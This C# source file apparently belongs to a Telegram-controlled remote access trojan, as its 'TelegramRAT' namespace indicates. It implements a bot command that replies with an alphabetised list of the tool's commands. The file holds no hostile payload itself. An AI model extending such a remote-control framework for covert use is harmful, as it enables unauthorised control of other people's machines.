using Telegram.Bot;
using System.Text;

namespace TelegramRAT.Commands.Core;

public class CommandsCommand(ITelegramBotClient botClient, IEnumerable<IBotCommand> commands) : AbstractBotCommand
{
    public override string Command => "commands";
    public override string Description => "Get all commands list sorted by alphabet";
    public override int ArgsCount => 0;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        StringBuilder commandListBuilder = new StringBuilder("List of all commands:\n\n");

        foreach (var command in commands.OrderBy(x => x.Command))
        {
            commandListBuilder.AppendLine("/" + command.Command);
        }

        commandListBuilder.AppendLine("\nHold to copy command");
        await botClient.SendMessage(
            model.Message.Chat.Id,
            commandListBuilder.ToString(),
            replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId }
        );
    }
}
